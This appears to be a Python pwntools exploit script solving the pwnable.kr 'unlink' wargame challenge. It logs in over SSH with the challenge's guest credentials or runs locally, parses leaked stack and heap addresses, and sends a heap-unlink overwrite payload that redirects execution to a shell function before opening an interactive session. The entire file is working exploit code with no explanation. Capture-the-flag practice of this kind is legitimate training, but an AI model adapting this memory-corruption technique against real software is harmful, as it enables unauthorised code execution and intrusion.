from struct import pack
from pwn import *
from sys import argv

BINARY = "./unlink"
SHELL = 0x080484eb

overflow = None
#context.log_level = 'DEBUG'

def run(name):
    global overflow

    if argv[1].lower() == "remote":
        overflow = 12
        s = ssh(host="pwnable.kr",
            user="unlink",
            port=2222,
            password="guest")
        return s.process(name)

    if argv[1].lower() == "local":
        overflow = 20
        e = ELF(name)
        return e.process()

p = run(BINARY)

# g = gdb.attach(p.pid, """
# break unlink 
# continue
# """)

data = p.recv().split('\n')

stack_addr = data[0].split()[-1]
heap_addr = data[1].split()[-1]
print stack_addr, heap_addr

stack = int(stack_addr, 16)
heap = int(heap_addr, 16)
print stack, heap

payload = ""
payload += cyclic(overflow)
payload += p32(SHELL)
payload += p32(stack - 28 - 4)
payload += p32(heap + 4)

p.sendline(payload)

p.interactive()